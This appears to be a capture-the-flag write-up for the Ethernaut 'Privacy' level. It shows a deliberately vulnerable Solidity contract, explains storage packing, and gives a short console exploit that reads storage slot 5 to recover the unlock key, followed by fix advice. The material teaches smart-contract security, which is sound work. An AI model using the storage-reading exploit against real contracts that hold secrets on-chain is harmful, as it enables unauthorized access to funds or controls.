# Level 12: Privacy

## Goal

Unlock the contract (set `locked` to false).

## The contract

```solidity
contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

## Vulnerability

Same root cause as the Vault level: `private` does not hide on-chain data. The key is `bytes16(data[2])`, which we can read directly from storage. We just need the correct slot, which requires understanding storage packing.

Storage layout:
- slot 0: `locked` (bool)
- slot 1: `ID` (uint256)
- slot 2: `flattening` + `denomination` + `awkwardness` (packed into one slot)
- slot 3: `data[0]`
- slot 4: `data[1]`
- slot 5: `data[2]`  <- the value we need

`bytes16(data[2])` takes the **high-order (left) 16 bytes** of the 32-byte slot.

## Exploit

```js
// Ethernaut console
const slot5 = await web3.eth.getStorageAt(contract.address, 5);
const key = slot5.slice(0, 34); // "0x" + first 32 hex chars = first 16 bytes
await contract.unlock(key);
```

## Fix

- Do not rely on `private` for confidentiality; all storage is public.
- Never store real secrets on-chain. Use hashes/commitments or keep secrets off-chain.
- Understand storage packing so you do not accidentally expose data you believe is hidden.

## Takeaway

This reinforces the Vault lesson with a twist: you must understand **variable packing** to locate the exact slot. On-chain confidentiality does not exist.
